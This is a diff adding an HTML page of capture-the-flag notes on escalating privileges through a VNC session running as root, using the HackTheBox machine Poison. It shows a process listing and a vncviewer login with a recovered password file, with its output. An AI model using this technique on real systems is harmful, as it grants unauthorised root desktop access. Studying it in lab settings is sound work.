@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>VNC / Xvnc</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># VNC</h1></strong><br /><br /><strong><h2>## VNC Running as Root</h2></strong><br /><strong>Examples</strong><br />• hackthebox Poision<br /><br />Is there a VNC session running as root?<br /><div class="codebox"><div class="codebox">charix@Poison:~&nbsp;%&nbsp;ps&nbsp;aux&nbsp;|&nbsp;grep&nbsp;root<br />[...]<br />root&nbsp;&nbsp;&nbsp;&nbsp;529&nbsp;&nbsp;&nbsp;0.0&nbsp;&nbsp;0.9&nbsp;&nbsp;23620&nbsp;&nbsp;9112&nbsp;v0-&nbsp;I&nbsp;&nbsp;&nbsp;&nbsp;13:12&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0:00.17&nbsp;Xvnc&nbsp;:1&nbsp;-desktop&nbsp;X&nbsp;-httpd&nbsp;/usr/local/share/tightvnc/classes&nbsp;-auth&nbsp;/root/.Xauthority&nbsp;-geometry&nbsp;1280x800&nbsp;-depth&nbsp;24&nbsp;-rfbwait&nbsp;1200<br />[..]</div></div><br /><br />Connect to the root VNC session using <code>vncviewer</code>, with <code>-passwd</code> to specify the password file - <code>secret</code>.<br /><div class="codebox"><div class="codebox">┌─[✗]─[horace@parrot]─[~/ctf/poison]<br />└──╼&nbsp;#vncviewer&nbsp;-passwd&nbsp;secret&nbsp;127.0.0.1:5901<br />Connected&nbsp;to&nbsp;RFB&nbsp;server,&nbsp;using&nbsp;protocol&nbsp;version&nbsp;3.8<br />Enabling&nbsp;TightVNC&nbsp;protocol&nbsp;extensions<br />Performing&nbsp;standard&nbsp;VNC&nbsp;authentication<br />Authentication&nbsp;successful<br />[..]</div></div></div>
+</body>
+</html>
